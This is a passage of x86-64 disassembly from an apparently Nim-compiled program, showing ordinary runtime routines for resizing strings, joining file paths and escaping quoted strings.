  4045a6:	c3                   	ret

00000000004045a7 <resizeString>:
  4045a7:	57                   	push   %rdi
  4045a8:	56                   	push   %rsi
  4045a9:	53                   	push   %rbx
  4045aa:	48 83 ec 20          	sub    $0x20,%rsp
  4045ae:	48 85 c9             	test   %rcx,%rcx
  4045b1:	48 89 ce             	mov    %rcx,%rsi
  4045b4:	74 4d                	je     404603 <resizeString+0x5c>
  4045b6:	48 03 11             	add    (%rcx),%rdx
  4045b9:	48 b9 ff ff ff ff ff 	movabs $0x3fffffffffffffff,%rcx
  4045c0:	ff ff 3f 
  4045c3:	48 23 4e 08          	and    0x8(%rsi),%rcx
  4045c7:	48 89 d3             	mov    %rdx,%rbx
  4045ca:	48 39 ca             	cmp    %rcx,%rdx
  4045cd:	7e 43                	jle    404612 <resizeString+0x6b>
  4045cf:	e8 09 d0 ff ff       	call   4015dd <resize__cOCDWr16YD4j3dBrbbH3yQsystem>
  4045d4:	48 39 c3             	cmp    %rax,%rbx
  4045d7:	48 0f 4c d8          	cmovl  %rax,%rbx
  4045db:	48 83 c6 10          	add    $0x10,%rsi
  4045df:	48 89 d9             	mov    %rbx,%rcx
  4045e2:	e8 6c fa ff ff       	call   404053 <rawNewStringNoInit>
  4045e7:	48 8b 4e f0          	mov    -0x10(%rsi),%rcx
  4045eb:	48 8d 50 10          	lea    0x10(%rax),%rdx
  4045ef:	48 89 d7             	mov    %rdx,%rdi
  4045f2:	48 89 08             	mov    %rcx,(%rax)
  4045f5:	48 ff c1             	inc    %rcx
  4045f8:	f3 a4                	rep movsb (%rsi),(%rdi)
  4045fa:	48 89 58 08          	mov    %rbx,0x8(%rax)
  4045fe:	48 89 c6             	mov    %rax,%rsi
  404601:	eb 0f                	jmp    404612 <resizeString+0x6b>
  404603:	48 89 d1             	mov    %rdx,%rcx
  404606:	48 83 c4 20          	add    $0x20,%rsp
  40460a:	5b                   	pop    %rbx
  40460b:	5e                   	pop    %rsi
  40460c:	5f                   	pop    %rdi
  40460d:	e9 41 fa ff ff       	jmp    404053 <rawNewStringNoInit>
  404612:	48 89 f0             	mov    %rsi,%rax
  404615:	48 83 c4 20          	add    $0x20,%rsp
  404619:	5b                   	pop    %rbx
  40461a:	5e                   	pop    %rsi
  40461b:	5f                   	pop    %rdi
  40461c:	c3                   	ret

000000000040461d <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA>:
  40461d:	41 56                	push   %r14
  40461f:	41 55                	push   %r13
  404621:	41 54                	push   %r12
  404623:	55                   	push   %rbp
  404624:	57                   	push   %rdi
  404625:	56                   	push   %rsi
  404626:	53                   	push   %rbx
  404627:	48 83 ec 60          	sub    $0x60,%rsp
  40462b:	4d 85 c0             	test   %r8,%r8
  40462e:	48 89 cb             	mov    %rcx,%rbx
  404631:	49 89 d4             	mov    %rdx,%r12
  404634:	4c 89 c6             	mov    %r8,%rsi
  404637:	74 14                	je     40464d <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x30>
  404639:	49 8b 00             	mov    (%r8),%rax
  40463c:	48 85 c0             	test   %rax,%rax
  40463f:	7e 07                	jle    404648 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x2b>
  404641:	41 8a 44 00 0f       	mov    0xf(%r8,%rax,1),%al
  404646:	eb 1b                	jmp    404663 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x46>
  404648:	40 b7 00             	mov    $0x0,%dil
  40464b:	75 23                	jne    404670 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x53>
  40464d:	48 8b 03             	mov    (%rbx),%rax
  404650:	31 ff                	xor    %edi,%edi
  404652:	48 85 c0             	test   %rax,%rax
  404655:	74 19                	je     404670 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x53>
  404657:	48 8b 10             	mov    (%rax),%rdx
  40465a:	48 85 d2             	test   %rdx,%rdx
  40465d:	7e 11                	jle    404670 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x53>
  40465f:	8a 44 10 0f          	mov    0xf(%rax,%rdx,1),%al
  404663:	3c 5c                	cmp    $0x5c,%al
  404665:	40 0f 94 c7          	sete   %dil
  404669:	3c 2f                	cmp    $0x2f,%al
  40466b:	0f 94 c2             	sete   %dl
  40466e:	09 d7                	or     %edx,%edi
  404670:	4c 8d 6c 24 48       	lea    0x48(%rsp),%r13
  404675:	31 d2                	xor    %edx,%edx
  404677:	48 89 d9             	mov    %rbx,%rcx
  40467a:	e8 42 fe ff ff       	call   4044c1 <normalizePathEnd__gKUeJXj8CrWvxdeNCA2BXg>
  40467f:	ba 18 00 00 00       	mov    $0x18,%edx
  404684:	4c 89 e9             	mov    %r13,%rcx
  404687:	e8 36 d3 ff ff       	call   4019c2 <nimZeroMem.lto_priv.59>
  40468c:	49 8b 04 24          	mov    (%r12),%rax
  404690:	48 d1 f8             	sar    $1,%rax
  404693:	48 85 c0             	test   %rax,%rax
  404696:	0f 9f 44 24 58       	setg   0x58(%rsp)
  40469b:	7e 37                	jle    4046d4 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0xb7>
  40469d:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
  4046a2:	31 d2                	xor    %edx,%edx
  4046a4:	31 c9                	xor    %ecx,%ecx
  4046a6:	48 85 f6             	test   %rsi,%rsi
  4046a9:	49 89 c0             	mov    %rax,%r8
  4046ac:	74 03                	je     4046b1 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x94>
  4046ae:	48 8b 0e             	mov    (%rsi),%rcx
  4046b1:	48 39 c1             	cmp    %rax,%rcx
  4046b4:	7e 15                	jle    4046cb <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0xae>
  4046b6:	8a 4c 06 10          	mov    0x10(%rsi,%rax,1),%cl
  4046ba:	48 ff c0             	inc    %rax
  4046bd:	80 f9 5c             	cmp    $0x5c,%cl
  4046c0:	75 04                	jne    4046c6 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0xa9>
  4046c2:	b2 01                	mov    $0x1,%dl
  4046c4:	eb de                	jmp    4046a4 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x87>
  4046c6:	80 f9 2f             	cmp    $0x2f,%cl
  4046c9:	74 f7                	je     4046c2 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0xa5>
  4046cb:	84 d2                	test   %dl,%dl
  4046cd:	74 05                	je     4046d4 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0xb7>
  4046cf:	4c 89 44 24 48       	mov    %r8,0x48(%rsp)
  4046d4:	4c 8d 74 24 30       	lea    0x30(%rsp),%r14
  4046d9:	31 c0                	xor    %eax,%eax
  4046db:	48 85 f6             	test   %rsi,%rsi
  4046de:	48 8b 54 24 48       	mov    0x48(%rsp),%rdx
  4046e3:	74 03                	je     4046e8 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0xcb>
  4046e5:	48 8b 06             	mov    (%rsi),%rax
  4046e8:	48 39 c2             	cmp    %rax,%rdx
  4046eb:	7c 11                	jl     4046fe <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0xe1>
  4046ed:	48 8b 03             	mov    (%rbx),%rax
  4046f0:	48 85 c0             	test   %rax,%rax
  4046f3:	0f 85 07 02 00 00    	jne    404900 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x2e3>
  4046f9:	e9 08 02 00 00       	jmp    404906 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x2e9>
  4046fe:	49 89 f0             	mov    %rsi,%r8
  404701:	4c 89 ea             	mov    %r13,%rdx
  404704:	4c 89 f1             	mov    %r14,%rcx
  404707:	e8 10 d3 ff ff       	call   401a1c <next__am1q4dBd9cls9au5CcmkX5oA>
  40470c:	49 8b 04 24          	mov    (%r12),%rax
  404710:	48 8b 6c 24 30       	mov    0x30(%rsp),%rbp
  404715:	4c 8b 44 24 38       	mov    0x38(%rsp),%r8
  40471a:	49 89 c1             	mov    %rax,%r9
  40471d:	49 d1 f9             	sar    $1,%r9
  404720:	75 19                	jne    40473b <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x11e>
  404722:	4c 39 c5             	cmp    %r8,%rbp
  404725:	75 14                	jne    40473b <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x11e>
  404727:	8a 54 2e 10          	mov    0x10(%rsi,%rbp,1),%dl
  40472b:	80 fa 5c             	cmp    $0x5c,%dl
  40472e:	0f 94 c1             	sete   %cl
  404731:	80 fa 2f             	cmp    $0x2f,%dl
  404734:	0f 94 c2             	sete   %dl
  404737:	08 d1                	or     %dl,%cl
  404739:	75 1a                	jne    404755 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x138>
  40473b:	48 8d 55 01          	lea    0x1(%rbp),%rdx
  40473f:	49 39 d0             	cmp    %rdx,%r8
  404742:	75 4c                	jne    404790 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x173>
  404744:	80 7c 2e 10 2e       	cmpb   $0x2e,0x10(%rsi,%rbp,1)
  404749:	75 45                	jne    404790 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x173>
  40474b:	42 80 7c 06 10 2e    	cmpb   $0x2e,0x10(%rsi,%r8,1)
  404751:	74 62                	je     4047b5 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x198>
  404753:	eb 3b                	jmp    404790 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x173>
  404755:	48 8b 0b             	mov    (%rbx),%rcx
  404758:	48 85 c9             	test   %rcx,%rcx
  40475b:	74 14                	je     404771 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x154>
  40475d:	48 8b 01             	mov    (%rcx),%rax
  404760:	48 85 c0             	test   %rax,%rax
  404763:	74 0c                	je     404771 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x154>
  404765:	8a 44 01 0f          	mov    0xf(%rcx,%rax,1),%al
  404769:	3c 5c                	cmp    $0x5c,%al
  40476b:	74 19                	je     404786 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x169>
  40476d:	3c 2f                	cmp    $0x2f,%al
  40476f:	74 15                	je     404786 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x169>
  404771:	ba 5c 00 00 00       	mov    $0x5c,%edx
  404776:	e8 4f fb ff ff       	call   4042ca <addChar>
  40477b:	48 89 d9             	mov    %rbx,%rcx
  40477e:	48 89 c2             	mov    %rax,%rdx
  404781:	e8 3c e7 ff ff       	call   402ec2 <unsureAsgnRef>
  404786:	49 83 0c 24 01       	orq    $0x1,(%r12)
  40478b:	e9 49 ff ff ff       	jmp    4046d9 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0xbc>
  404790:	31 c0                	xor    %eax,%eax
  404792:	4c 39 c5             	cmp    %r8,%rbp
  404795:	75 08                	jne    40479f <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x182>
  404797:	80 7c 2e 10 2e       	cmpb   $0x2e,0x10(%rsi,%rbp,1)
  40479c:	0f 94 c0             	sete   %al
  40479f:	4c 39 c5             	cmp    %r8,%rbp
  4047a2:	0f 8f 31 ff ff ff    	jg     4046d9 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0xbc>
  4047a8:	84 c0                	test   %al,%al
  4047aa:	0f 85 29 ff ff ff    	jne    4046d9 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0xbc>
  4047b0:	e9 d0 00 00 00       	jmp    404885 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x268>
  4047b5:	4d 85 c9             	test   %r9,%r9
  4047b8:	48 8b 0b             	mov    (%rbx),%rcx
  4047bb:	7f 0a                	jg     4047c7 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x1aa>
  4047bd:	48 85 c9             	test   %rcx,%rcx
  4047c0:	75 55                	jne    404817 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x1fa>
  4047c2:	e9 83 00 00 00       	jmp    40484a <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x22d>
  4047c7:	45 31 c0             	xor    %r8d,%r8d
  4047ca:	48 85 c9             	test   %rcx,%rcx
  4047cd:	74 03                	je     4047d2 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x1b5>
  4047cf:	4c 8b 01             	mov    (%rcx),%r8
  4047d2:	83 e0 01             	and    $0x1,%eax
  4047d5:	49 8d 50 ff          	lea    -0x1(%r8),%rdx
  4047d9:	48 39 d0             	cmp    %rdx,%rax
  4047dc:	7d 16                	jge    4047f4 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x1d7>
  4047de:	44 8a 4c 11 10       	mov    0x10(%rcx,%rdx,1),%r9b
  4047e3:	41 80 f9 5c          	cmp    $0x5c,%r9b
  4047e7:	74 0b                	je     4047f4 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x1d7>
  4047e9:	41 80 f9 2f          	cmp    $0x2f,%r9b
  4047ed:	74 05                	je     4047f4 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x1d7>
  4047ef:	49 89 d0             	mov    %rdx,%r8
  4047f2:	eb e1                	jmp    4047d5 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x1b8>
  4047f4:	4d 85 c0             	test   %r8,%r8
  4047f7:	0f 8e dc fe ff ff    	jle    4046d9 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0xbc>
  4047fd:	e8 02 f9 ff ff       	call   404104 <setLengthStr>
  404802:	48 89 d9             	mov    %rbx,%rcx
  404805:	48 89 c2             	mov    %rax,%rdx
  404808:	e8 b5 e6 ff ff       	call   402ec2 <unsureAsgnRef>
  40480d:	49 83 2c 24 02       	subq   $0x2,(%r12)
  404812:	e9 c2 fe ff ff       	jmp    4046d9 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0xbc>
  404817:	48 8b 01             	mov    (%rcx),%rax
  40481a:	48 85 c0             	test   %rax,%rax
  40481d:	7e 2b                	jle    40484a <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x22d>
  40481f:	8a 44 01 0f          	mov    0xf(%rcx,%rax,1),%al
  404823:	3c 5c                	cmp    $0x5c,%al
  404825:	74 23                	je     40484a <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x22d>
  404827:	3c 2f                	cmp    $0x2f,%al
  404829:	74 1f                	je     40484a <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x22d>
  40482b:	ba 5c 00 00 00       	mov    $0x5c,%edx
  404830:	4c 89 44 24 28       	mov    %r8,0x28(%rsp)
  404835:	e8 90 fa ff ff       	call   4042ca <addChar>
  40483a:	48 89 d9             	mov    %rbx,%rcx
  40483d:	48 89 c2             	mov    %rax,%rdx
  404840:	e8 7d e6 ff ff       	call   402ec2 <unsureAsgnRef>
  404845:	4c 8b 44 24 28       	mov    0x28(%rsp),%r8
  40484a:	48 89 ea             	mov    %rbp,%rdx
  40484d:	48 89 f1             	mov    %rsi,%rcx
  404850:	e8 be f5 ff ff       	call   403e13 <substr__2yh9cer0ymNRHlOOg8P7IuA>
  404855:	31 d2                	xor    %edx,%edx
  404857:	48 85 c0             	test   %rax,%rax
  40485a:	48 89 c5             	mov    %rax,%rbp
  40485d:	74 03                	je     404862 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x245>
  40485f:	48 8b 10             	mov    (%rax),%rdx
  404862:	48 8b 0b             	mov    (%rbx),%rcx
  404865:	e8 3d fd ff ff       	call   4045a7 <resizeString>
  40486a:	48 89 d9             	mov    %rbx,%rcx
  40486d:	48 89 c2             	mov    %rax,%rdx
  404870:	e8 4d e6 ff ff       	call   402ec2 <unsureAsgnRef>
  404875:	48 8b 0b             	mov    (%rbx),%rcx
  404878:	48 89 ea             	mov    %rbp,%rdx
  40487b:	e8 23 d1 ff ff       	call   4019a3 <appendString.lto_priv.49>
  404880:	e9 54 fe ff ff       	jmp    4046d9 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0xbc>
  404885:	48 8b 0b             	mov    (%rbx),%rcx
  404888:	48 85 c9             	test   %rcx,%rcx
  40488b:	74 33                	je     4048c0 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x2a3>
  40488d:	48 8b 01             	mov    (%rcx),%rax
  404890:	48 85 c0             	test   %rax,%rax
  404893:	7e 2b                	jle    4048c0 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x2a3>
  404895:	8a 44 01 0f          	mov    0xf(%rcx,%rax,1),%al
  404899:	3c 5c                	cmp    $0x5c,%al
  40489b:	74 23                	je     4048c0 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x2a3>
  40489d:	3c 2f                	cmp    $0x2f,%al
  40489f:	74 1f                	je     4048c0 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x2a3>
  4048a1:	ba 5c 00 00 00       	mov    $0x5c,%edx
  4048a6:	4c 89 44 24 28       	mov    %r8,0x28(%rsp)
  4048ab:	e8 1a fa ff ff       	call   4042ca <addChar>
  4048b0:	48 89 d9             	mov    %rbx,%rcx
  4048b3:	48 89 c2             	mov    %rax,%rdx
  4048b6:	e8 07 e6 ff ff       	call   402ec2 <unsureAsgnRef>
  4048bb:	4c 8b 44 24 28       	mov    0x28(%rsp),%r8
  4048c0:	48 89 ea             	mov    %rbp,%rdx
  4048c3:	48 89 f1             	mov    %rsi,%rcx
  4048c6:	e8 48 f5 ff ff       	call   403e13 <substr__2yh9cer0ymNRHlOOg8P7IuA>
  4048cb:	31 d2                	xor    %edx,%edx
  4048cd:	48 85 c0             	test   %rax,%rax
  4048d0:	48 89 c5             	mov    %rax,%rbp
  4048d3:	74 03                	je     4048d8 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x2bb>
  4048d5:	48 8b 10             	mov    (%rax),%rdx
  4048d8:	48 8b 0b             	mov    (%rbx),%rcx
  4048db:	e8 c7 fc ff ff       	call   4045a7 <resizeString>
  4048e0:	48 89 d9             	mov    %rbx,%rcx
  4048e3:	48 89 c2             	mov    %rax,%rdx
  4048e6:	e8 d7 e5 ff ff       	call   402ec2 <unsureAsgnRef>
  4048eb:	48 8b 0b             	mov    (%rbx),%rcx
  4048ee:	48 89 ea             	mov    %rbp,%rdx
  4048f1:	e8 ad d0 ff ff       	call   4019a3 <appendString.lto_priv.49>
  4048f6:	49 83 04 24 02       	addq   $0x2,(%r12)
  4048fb:	e9 d9 fd ff ff       	jmp    4046d9 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0xbc>
  404900:	48 83 38 00          	cmpq   $0x0,(%rax)
  404904:	75 0b                	jne    404911 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x2f4>
  404906:	48 85 f6             	test   %rsi,%rsi
  404909:	74 06                	je     404911 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x2f4>
  40490b:	48 83 3e 00          	cmpq   $0x0,(%rsi)
  40490f:	75 1c                	jne    40492d <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x310>
  404911:	40 0f b6 d7          	movzbl %dil,%edx
  404915:	48 89 d9             	mov    %rbx,%rcx
  404918:	e8 a4 fb ff ff       	call   4044c1 <normalizePathEnd__gKUeJXj8CrWvxdeNCA2BXg>
  40491d:	90                   	nop
  40491e:	48 83 c4 60          	add    $0x60,%rsp
  404922:	5b                   	pop    %rbx
  404923:	5e                   	pop    %rsi
  404924:	5f                   	pop    %rdi
  404925:	5d                   	pop    %rbp
  404926:	41 5c                	pop    %r12
  404928:	41 5d                	pop    %r13
  40492a:	41 5e                	pop    %r14
  40492c:	c3                   	ret
  40492d:	48 8d 0d 5c ca 00 00 	lea    0xca5c(%rip),%rcx        # 411390 <TM__DfU0iuayCGwHDN1Exp9cbKg_2>
  404934:	e8 8a f7 ff ff       	call   4040c3 <copyString>
  404939:	48 89 d9             	mov    %rbx,%rcx
  40493c:	48 89 c2             	mov    %rax,%rdx
  40493f:	e8 7e e5 ff ff       	call   402ec2 <unsureAsgnRef>
  404944:	eb cb                	jmp    404911 <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA+0x2f4>

0000000000404946 <nosjoinPath.constprop.8>:
  404946:	56                   	push   %rsi
  404947:	53                   	push   %rbx
  404948:	48 83 ec 38          	sub    $0x38,%rsp
  40494c:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
  404953:	00 00 
  404955:	49 89 c8             	mov    %rcx,%r8
  404958:	31 c9                	xor    %ecx,%ecx
  40495a:	4d 85 c0             	test   %r8,%r8
  40495d:	74 03                	je     404962 <nosjoinPath.constprop.8+0x1c>
  40495f:	49 8b 08             	mov    (%r8),%rcx
  404962:	4c 89 44 24 50       	mov    %r8,0x50(%rsp)
  404967:	48 8d 74 24 28       	lea    0x28(%rsp),%rsi
  40496c:	48 83 c1 0d          	add    $0xd,%rcx
  404970:	e8 d7 f3 ff ff       	call   403d4c <rawNewString>
  404975:	4c 8b 44 24 50       	mov    0x50(%rsp),%r8
  40497a:	48 8d 5c 24 20       	lea    0x20(%rsp),%rbx
  40497f:	48 89 f2             	mov    %rsi,%rdx
  404982:	48 89 d9             	mov    %rbx,%rcx
  404985:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
  40498a:	48 c7 44 24 28 00 00 	movq   $0x0,0x28(%rsp)
  404991:	00 00 
  404993:	e8 85 fc ff ff       	call   40461d <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA>
  404998:	4c 8d 05 41 cf 00 00 	lea    0xcf41(%rip),%r8        # 4118e0 <TM__ngdzsFozov7SgOThmPolog_3>
  40499f:	48 89 f2             	mov    %rsi,%rdx
  4049a2:	48 89 d9             	mov    %rbx,%rcx
  4049a5:	e8 73 fc ff ff       	call   40461d <joinPathImpl__zwiv42T0z9bOei4bjr58A9cA>
  4049aa:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
  4049af:	48 83 c4 38          	add    $0x38,%rsp
  4049b3:	5b                   	pop    %rbx
  4049b4:	5e                   	pop    %rsi
  4049b5:	c3                   	ret

00000000004049b6 <addQuoted__45fPtFhY4FavRaYwDhRfuA>:
  4049b6:	41 57                	push   %r15
  4049b8:	41 56                	push   %r14
  4049ba:	41 55                	push   %r13
  4049bc:	41 54                	push   %r12
  4049be:	55                   	push   %rbp
  4049bf:	57                   	push   %rdi
  4049c0:	56                   	push   %rsi
  4049c1:	53                   	push   %rbx
  4049c2:	48 83 ec 28          	sub    $0x28,%rsp
  4049c6:	48 89 cb             	mov    %rcx,%rbx
  4049c9:	48 8b 09             	mov    (%rcx),%rcx
  4049cc:	48 89 d5             	mov    %rdx,%rbp
  4049cf:	ba 01 00 00 00       	mov    $0x1,%edx
  4049d4:	e8 ce fb ff ff       	call   4045a7 <resizeString>
  4049d9:	48 89 d9             	mov    %rbx,%rcx
  4049dc:	48 89 c2             	mov    %rax,%rdx
  4049df:	e8 de e4 ff ff       	call   402ec2 <unsureAsgnRef>
  4049e4:	48 8b 0b             	mov    (%rbx),%rcx
  4049e7:	48 8d 15 e2 c8 00 00 	lea    0xc8e2(%rip),%rdx        # 4112d0 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_15>
  4049ee:	e8 8a cf ff ff       	call   40197d <appendString.part.0>
  4049f3:	48 85 ed             	test   %rbp,%rbp
  4049f6:	75 37                	jne    404a2f <addQuoted__45fPtFhY4FavRaYwDhRfuA+0x79>
  4049f8:	48 8b 0b             	mov    (%rbx),%rcx
  4049fb:	ba 01 00 00 00       	mov    $0x1,%edx
  404a00:	e8 a2 fb ff ff       	call   4045a7 <resizeString>
  404a05:	48 89 d9             	mov    %rbx,%rcx
  404a08:	48 89 c2             	mov    %rax,%rdx
  404a0b:	e8 b2 e4 ff ff       	call   402ec2 <unsureAsgnRef>
  404a10:	48 8b 0b             	mov    (%rbx),%rcx
  404a13:	48 8d 15 b6 c8 00 00 	lea    0xc8b6(%rip),%rdx        # 4112d0 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_15>
  404a1a:	48 83 c4 28          	add    $0x28,%rsp
  404a1e:	5b                   	pop    %rbx
  404a1f:	5e                   	pop    %rsi
  404a20:	5f                   	pop    %rdi
  404a21:	5d                   	pop    %rbp
  404a22:	41 5c                	pop    %r12
  404a24:	41 5d                	pop    %r13
  404a26:	41 5e                	pop    %r14
  404a28:	41 5f                	pop    %r15
  404a2a:	e9 4e cf ff ff       	jmp    40197d <appendString.part.0>
  404a2f:	4c 8b 6d 00          	mov    0x0(%rbp),%r13
  404a33:	4c 8d 35 16 c7 00 00 	lea    0xc716(%rip),%r14        # 411150 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_27>
  404a3a:	31 ff                	xor    %edi,%edi
  404a3c:	4c 8d 25 dd c6 00 00 	lea    0xc6dd(%rip),%r12        # 411120 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_28>
  404a43:	4c 8d 3d 66 c7 00 00 	lea    0xc766(%rip),%r15        # 4111b0 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_24>
  404a4a:	4c 39 ef             	cmp    %r13,%rdi
  404a4d:	48 8b 0b             	mov    (%rbx),%rcx
  404a50:	7d a6                	jge    4049f8 <addQuoted__45fPtFhY4FavRaYwDhRfuA+0x42>
  404a52:	0f be 54 3d 10       	movsbl 0x10(%rbp,%rdi,1),%edx
  404a57:	84 d2                	test   %dl,%dl
  404a59:	89 d6                	mov    %edx,%esi
  404a5b:	0f 88 3a 02 00 00    	js     404c9b <addQuoted__45fPtFhY4FavRaYwDhRfuA+0x2e5>
  404a61:	80 fa 21             	cmp    $0x21,%dl
  404a64:	0f 8f 8f 00 00 00    	jg     404af9 <addQuoted__45fPtFhY4FavRaYwDhRfuA+0x143>
  404a6a:	80 fa 20             	cmp    $0x20,%dl
  404a6d:	0f 8d 28 02 00 00    	jge    404c9b <addQuoted__45fPtFhY4FavRaYwDhRfuA+0x2e5>
  404a73:	80 fa 0a             	cmp    $0xa,%dl
  404a76:	0f 84 17 01 00 00    	je     404b93 <addQuoted__45fPtFhY4FavRaYwDhRfuA+0x1dd>
  404a7c:	7f 39                	jg     404ab7 <addQuoted__45fPtFhY4FavRaYwDhRfuA+0x101>
  404a7e:	80 fa 08             	cmp    $0x8,%dl
  404a81:	0f 84 ca 00 00 00    	je     404b51 <addQuoted__45fPtFhY4FavRaYwDhRfuA+0x19b>
  404a87:	0f 8f e5 00 00 00    	jg     404b72 <addQuoted__45fPtFhY4FavRaYwDhRfuA+0x1bc>
  404a8d:	80 fa 07             	cmp    $0x7,%dl
  404a90:	0f 85 b8 01 00 00    	jne    404c4e <addQuoted__45fPtFhY4FavRaYwDhRfuA+0x298>
  404a96:	ba 02 00 00 00       	mov    $0x2,%edx
  404a9b:	e8 07 fb ff ff       	call   4045a7 <resizeString>
  404aa0:	48 89 d9             	mov    %rbx,%rcx
  404aa3:	48 89 c2             	mov    %rax,%rdx
  404aa6:	e8 17 e4 ff ff       	call   402ec2 <unsureAsgnRef>
  404aab:	48 8d 15 fe c7 00 00 	lea    0xc7fe(%rip),%rdx        # 4112b0 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_16>
  404ab2:	e9 8d 01 00 00       	jmp    404c44 <addQuoted__45fPtFhY4FavRaYwDhRfuA+0x28e>
  404ab7:	80 fa 0c             	cmp    $0xc,%dl
  404aba:	0f 84 12 01 00 00    	je     404bd2 <addQuoted__45fPtFhY4FavRaYwDhRfuA+0x21c>
  404ac0:	0f 8c ee 00 00 00    	jl     404bb4 <addQuoted__45fPtFhY4FavRaYwDhRfuA+0x1fe>
  404ac6:	80 fa 0d             	cmp    $0xd,%dl
  404ac9:	0f 84 21 01 00 00    	je     404bf0 <addQuoted__45fPtFhY4FavRaYwDhRfuA+0x23a>
  404acf:	80 fa 1b             	cmp    $0x1b,%dl
  404ad2:	0f 85 76 01 00 00    	jne    404c4e <addQuoted__45fPtFhY4FavRaYwDhRfuA+0x298>
  404ad8:	ba 02 00 00 00       	mov    $0x2,%edx
  404add:	e8 c5 fa ff ff       	call   4045a7 <resizeString>
  404ae2:	48 89 d9             	mov    %rbx,%rcx
  404ae5:	48 89 c2             	mov    %rax,%rdx
  404ae8:	e8 d5 e3 ff ff       	call   402ec2 <unsureAsgnRef>
  404aed:	48 8d 15 dc c6 00 00 	lea    0xc6dc(%rip),%rdx        # 4111d0 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_23>
  404af4:	e9 4b 01 00 00       	jmp    404c44 <addQuoted__45fPtFhY4FavRaYwDhRfuA+0x28e>
  404af9:	80 fa 5b             	cmp    $0x5b,%dl
  404afc:	7f 3c                	jg     404b3a <addQuoted__45fPtFhY4FavRaYwDhRfuA+0x184>
  404afe:	80 fa 28             	cmp    $0x28,%dl
  404b01:	0f 8d 94 01 00 00    	jge    404c9b <addQuoted__45fPtFhY4FavRaYwDhRfuA+0x2e5>
  404b07:	80 fa 26             	cmp    $0x26,%dl
  404b0a:	0f 8f 18 01 00 00    	jg     404c28 <addQuoted__45fPtFhY4FavRaYwDhRfuA+0x272>
  404b10:	80 fa 23             	cmp    $0x23,%dl
  404b13:	0f 8d 82 01 00 00    	jge    404c9b <addQuoted__45fPtFhY4FavRaYwDhRfuA+0x2e5>
  404b19:	ba 02 00 00 00       	mov    $0x2,%edx
  404b1e:	e8 84 fa ff ff       	call   4045a7 <resizeString>
  404b23:	48 89 d9             	mov    %rbx,%rcx
  404b26:	48 89 c2             	mov    %rax,%rdx
  404b29:	e8 94 e3 ff ff       	call   402ec2 <unsureAsgnRef>
  404b2e:	48 8d 15 3b c6 00 00 	lea    0xc63b(%rip),%rdx        # 411170 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_26>
